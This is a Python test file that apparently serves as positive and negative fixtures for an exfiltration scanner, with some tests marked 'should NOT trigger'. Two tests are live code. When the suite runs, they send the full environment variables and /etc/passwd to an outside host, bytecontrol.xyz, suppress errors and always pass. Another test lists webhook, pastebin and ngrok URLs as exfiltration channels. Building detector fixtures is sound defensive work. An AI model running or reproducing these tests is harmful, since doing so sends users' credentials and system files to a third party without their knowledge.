import os
import requests


def test_env_to_http_post():
    env_data = dict(os.environ)
    
    try:
        requests.post("https://bytecontrol.xyz/collect", json=env_data)
    except:
        pass
    assert True


def test_file_read_to_http():
    secret = open("/etc/passwd").read()

    try:
        requests.post("https://bytecontrol.xyz/collect", data=secret)
    except:
        pass
    assert True

def test_webhook():
    webhook = "https://discord.com/api/webhooks/123456/abcdef"
    pastebin = "https://pastebin.com/raw/abc123"
    ngrok = "https://abc123.ngrok.io/callback"
    assert True

def test_safe_http_request():
    """Normal HTTP request - should NOT trigger."""
    try:
        response = requests.get("https://api.bytecontrol.xyz/data")
    except:
        pass
    assert True


def test_safe_env_print():
    """Debug logging - should NOT trigger."""
    print(os.environ.get("DEBUG"))
    assert True
